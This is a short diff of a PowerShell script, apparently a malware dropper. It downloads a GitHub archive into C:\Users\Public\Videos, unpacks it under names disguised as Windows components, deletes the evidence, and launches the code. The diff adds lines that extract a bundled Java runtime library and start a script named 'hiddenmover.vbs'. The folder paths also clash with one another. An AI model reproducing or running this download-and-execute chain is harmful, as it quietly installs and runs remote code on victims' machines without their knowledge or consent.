@@ -2,4 +2,6 @@ Invoke-WebRequest 'https://github.com/RaupenInspektor/Server/archive/refs/heads/
 Expand-archive 'C:\Users\Public\Videos\DoWindowsGraphicalUserInterface.zip' 'C:\Users\Public\Videos'
 Rename-Item 'C:\Users\Public\Videos\Server-main' 'GraphicalUserInterface'
 Remove-Item 'C:\Users\Public\Videos\DoWindowsGraphicalUserInterface.zip'
-Start-Process -FilePath 'C:\Users\Public\Videos\WindowsGraphicalUserInterface\move.bat'
+Expand-archive 'C:\Users\Public\Videos\WindowsGraphicalUserInterface\myapp\jre6\lib.zip' 'C:\Users\Public\Videos\GraphicalUserInterface\myapp\jre6'
+Remove-Item 'C:\Users\Public\Videos\WindowsGraphicalUserInterface\myapp\jre6\lib.zip'
+Start-Process -FilePath 'C:\Users\Public\Videos\WindowsGraphicalUserInterface\hiddenmover.vbs'
